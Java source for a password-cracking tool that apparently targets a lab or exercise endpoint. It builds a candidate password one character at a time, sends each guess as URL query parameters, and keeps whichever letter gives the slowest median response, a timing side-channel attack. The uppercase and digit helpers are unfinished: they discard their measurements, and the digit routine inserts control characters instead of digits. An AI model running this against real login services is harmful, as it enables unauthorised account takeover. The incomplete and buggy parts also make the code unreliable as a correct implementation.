import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;

public class SolvePassword {

    private int length;
    private String baseUrl;
    private String username;
    private Integer difficulty;
    final private   ArrayList<Character> smallLetterByFrequency = new ArrayList<Character>(
            Arrays.asList('e','t','a','o','i','n','s','r','h','l','d','c','u','m','f'
                        ,'p','g','w','y','b','v','k','x','j','q','z'));
    final private   ArrayList<Character> capitalLetterByFrequency = new ArrayList<Character>(
            Arrays.asList('E','T','A','O','I','N','S','R','H','L','D','C','U','M','F'
                    ,'P','G','W','Y','B','V','K','X','J','Q','Z'));

    public SolvePassword(int length, String baseUrl, String username, Integer difficulty) {
        this.length = length;
        this.baseUrl = baseUrl;
        this.username = username;
        this.difficulty = difficulty;
    }

    public String solvePassword(){
        StringBuilder password = createFirstPassword();
        for (int i=0;i<length;i++){
            password.setCharAt(i, measureTimeForGivenChars(password,i));
        }
        return password.toString();
    }

    private StringBuilder createFirstPassword() {
        String tempPassword= "";
        for(int i=0;i<length;i++){
            tempPassword+="e";
        }
        StringBuilder password=new StringBuilder();
        password.append(tempPassword);
        return password;
    }

    private char measureTimeForGivenChars(StringBuilder password, int charPosition){
        HashMap<Character,Double> measureEachChar = new HashMap<>();
        for(int j=0;j<smallLetterByFrequency.size();j++){
            password.setCharAt(charPosition,smallLetterByFrequency.get(j));
            String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
            URLRequest urlRequest = new URLRequest(url);
            measureEachChar.put(smallLetterByFrequency.get(j),urlRequest.measureConnectionToGivenURLMedian());
        }
        char solvedChar = measureEachChar.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getKey();
        System.out.println("letter in place "+ charPosition + " is "+ solvedChar);
        return solvedChar;
    }

    private String measureTimeForUpperCase(StringBuilder password,int charPosition){
        for(int j=0;j<capitalLetterByFrequency.size();j++){
            password.setCharAt(charPosition,capitalLetterByFrequency.get(j));
            String url = createUrl(this.baseUrl, this.username, password.toString(), 2);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMedian();
        }
        return "";
    }

    private String measureTimeForDigits(StringBuilder password,int charPosition){
        for(int j=0;j<10;j++){
            ///check!
            password.setCharAt(charPosition,(char) j);
            String url = createUrl(this.baseUrl, this.username, password.toString(), 2);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMedian();
        }
        return "";
    }


    private String createUrl(String baseUrl, String username, String password, Integer difficulty){
        String url_format = baseUrl + "\\?user=%s\\&password=%s\\&difficulty=%d";
        String url = String.format(url_format,username, password, difficulty);
        return url;
    }
}
